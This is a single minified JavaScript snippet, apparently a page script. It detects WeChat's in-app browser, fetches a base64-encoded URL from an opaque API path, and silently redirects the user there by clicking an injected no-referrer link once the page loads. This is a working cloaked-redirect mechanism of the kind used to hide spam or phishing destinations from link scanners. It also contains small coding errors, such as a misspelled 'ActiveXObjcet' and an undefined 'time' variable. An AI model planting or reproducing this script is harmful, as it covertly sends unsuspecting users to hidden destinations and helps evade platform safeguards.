(function(){function t(n){function i(n){n.type=(n.type||"GET").toUpperCase();n.data=t(n.data);var i=null;i=window.XMLHttpRequest?new XMLHttpRequest:new ActiveXObjcet("Microsoft.XMLHTTP");i.onreadystatechange=function(){var t,r,u;i.readyState==4&&(t=i.status,t>=200&&t<300?(r="",u=i.getResponseHeader("Content-type"),r=u.indexOf("xml")!==-1&&i.responseXML?i.responseXML:u.indexOf("application/json")!==-1?JSON.parse(i.responseText):i.responseText,n.success&&n.success(r)):n.error&&n.error(t))};n.type=="GET"?(i.open(n.type,n.url+"?"+n.data,!0),i.send()):(i.open(n.type,n.url,!0),i.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8"),i.send(n.data))}function r(n){var e=typeof n.jsonp=="string"?n.jsonp:"callback",r=typeof n.jsonpCallback=="string"?n.jsonpCallback:"jsonp_"+(new Date).getTime(),u=document.getElementsByTagName("head")[0],f,i;n.data[e]=r;f=t(n.data);i=document.createElement("script");u.appendChild(i);window[r]=function(t){u.removeChild(i);clearTimeout(i.timer);delete window[r];n.success&&n.success(t)};i.src=n.url+"?"+f;n.time&&(i.timer=setTimeout(function(){delete window[r];u.removeChild(i);n.error&&n.error({message:"超时"})},time))}function t(n){var t=[];for(var i in n)t.push(encodeURIComponent(i)+"="+encodeURIComponent(n[i]));return t.push("_="+(new Date).getTime()),t.join("&")}n=n||{};n.data=n.data||{};var i=n.jsonp?r(n):i(n)}function n(n){if(n){var t=document.createElement("a");t.setAttribute("rel","noreferrer");t.setAttribute("href",n);document.getElementsByTagName("head")[0].appendChild(t);t.click()}}function r(){var n=navigator.userAgent.toLowerCase();return/micromessenger/.test(n)}function u(n){function t(){document.removeEventListener("DOMContentLoaded",t);window.removeEventListener("load",t);n()}document.readyState!=="complete"&&(document.readyState==="loading"||document.documentElement.doScroll)?(document.addEventListener("DOMContentLoaded",t),window.addEventListener("load",t)):window.setTimeout(n)}function f(n){u(function(){window.setTimeout(n,0)})}r()&&f(function(){t({url:"api/t0HKkS4i00000qeUyqOi666cC4",type:"POST",success:function(t){if(t!=null){var i=unescape(window.atob(t));n(i)}}})})})()